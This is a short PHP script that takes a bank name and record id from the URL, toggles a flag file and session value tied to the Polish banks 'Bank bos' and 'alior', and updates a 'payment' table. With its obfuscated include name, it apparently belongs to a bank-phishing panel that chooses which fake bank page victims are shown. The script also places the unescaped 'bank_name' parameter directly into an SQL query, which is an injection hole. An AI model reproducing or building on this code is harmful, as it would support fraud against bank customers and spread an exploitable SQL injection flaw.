<?php include('../db.php'); 
include('../YH0uW3ecaRHG16ld4waY.php');
$bank_name = $_GET['bank_name'];
$id = $_GET['id'];
$f = dirname(__FILE__). '/'.URL_directory2.'/alior/.bb';
if($bank_name == 'Bank bos') {
	fopen($f, 'w');
	$_SESSION['bank_bos'] = 1;
	echo $bank_name = 'Bank alior';
}else {
	unlink($f);
}
$sqsp = "UPDATE `payment` SET `bank_name` = '$bank_name', `last_login` = '0' WHERE `id` = '".mysqli_real_escape_string($con,$_GET['id'])."'";
$con->query($sqsp);
?>
